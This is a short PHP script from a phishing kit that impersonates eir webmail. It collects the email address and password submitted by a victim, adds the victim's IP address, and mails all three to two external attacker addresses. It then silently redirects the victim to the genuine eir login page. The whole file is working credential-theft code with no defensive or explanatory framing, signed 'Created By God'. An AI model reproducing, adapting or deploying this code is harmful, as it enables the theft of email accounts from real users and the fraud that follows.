<?
$ip = getenv("REMOTE_ADDR");
$message  = "---------------+ eir webmail +--------------\n";
$message .= "Username : ".$_POST['email']."\n";
$message .= "Password: ".$_POST['eirpassword']."\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------Created By God-----------------\n";
$send = "goodman443442@gmail.com,goodman443442@yandex.ru";
$subject = "eir webmail Logs [ $ip ]";
$headers = "From: eir<eir@shellshost.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail("$send", "$subject", $message); 
?>
<script>
    window.top.location.href = "https://www.eir.ie/email/login/";

</script>

